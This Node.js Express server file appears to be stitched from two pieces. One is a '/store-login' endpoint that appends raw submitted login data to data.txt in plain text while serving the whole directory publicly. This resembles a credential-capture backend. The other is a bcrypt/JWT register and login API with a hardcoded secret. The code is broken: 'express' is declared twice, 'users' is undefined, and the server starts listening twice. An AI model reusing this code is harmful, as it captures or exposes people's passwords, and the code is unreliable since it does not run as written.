require('dotenv').config();
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors');

const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');

app.use(express.static(__dirname));
app.use(express.text());

app.post('/store-login', (req, res) => {
    fs.appendFile('data.txt', req.body, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            res.status(500).send('Error storing login data');
            return;
        }
        res.send('Login data stored successfully');
    });
});

app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});

// JWT secret (use environment variable in production)
const JWT_SECRET = 'your-secret-key';

// Serve static files
app.use(express.static('.'));

// Register endpoint
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password } = req.body;

        // Check if user already exists
        if (users.find(u => u.email === email)) {
            return res.status(400).json({ error: 'User already exists' });
        }

        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);

        // Create user
        const user = {
            id: users.length + 1,
            username,
            email,
            password: hashedPassword
        };

        users.push(user);

        res.status(201).json({ message: 'User created successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Error creating user' });
    }
});

// Login endpoint
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Find user
        const user = users.find(u => u.email === email);
        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        // Check password
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        // Generate JWT
        const token = jwt.sign(
            { userId: user.id, email: user.email },
            JWT_SECRET,
            { expiresIn: '1h' }
        );

        res.json({ token });
    } catch (error) {
        res.status(500).json({ error: 'Error logging in' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});